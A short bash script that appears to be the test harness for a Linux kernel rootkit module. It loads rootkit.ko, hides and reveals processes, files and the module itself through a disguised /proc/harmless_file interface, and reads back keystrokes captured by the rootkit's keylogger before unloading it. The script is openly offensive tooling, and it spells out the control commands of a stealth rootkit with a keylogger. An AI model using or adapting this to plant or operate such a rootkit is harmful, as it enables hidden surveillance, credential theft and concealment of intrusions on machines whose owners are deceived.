#!/bin/bash
echo loading module
insmod rootkit.ko
echo -n ####################################
echo testing proc hiding
echo hiding init
echo hide 1 > /proc/harmless_file/hide_pid
sleep 1
echo "ps -e | grep init:`ps -e | grep init`"
echo bringing init back to light
echo show 1 > /proc/harmless_file/hide_pid
sleep 1
echo "ps -e | grep init:`ps -e | grep init`"
echo -n ####################################

echo testing file hiding functionality
mkdir test
touch test/hideme
echo "ls -l test:"`ls -l test`
echo hiding file
echo "hide `pwd`/test/hideme" > /proc/harmless_file/hide_file
sleep 1
echo "ls -l test:"`ls -l test`
echo showing file
echo "show `pwd`/test/hideme" > /proc/harmless_file/hide_file
sleep 1
echo "ls -l test:"`ls -l test`

echo -n ####################################
echo testing module hiding functionality
echo "lsmod | grep rootkit:"`lsmod | grep rootkit`
echo hiding module
echo 1 > /proc/harmless_file/hide_module
sleep 1
echo "lsmod | grep rootkit:"`lsmod | grep rootkit`
echo bringing module to back light
echo 0 > /proc/harmless_file/hide_module
sleep 1
echo "lsmod | grep rootkit:"`lsmod | grep rootkit`

echo -n ####################################
echo "keylogger test , please type something"
sleep 3
echo "cat /proc/harmless_file/keylogger"
cat /proc/harmless_file/keylogger

echo -n ####################################

echo unloading module
rmmod rootkit
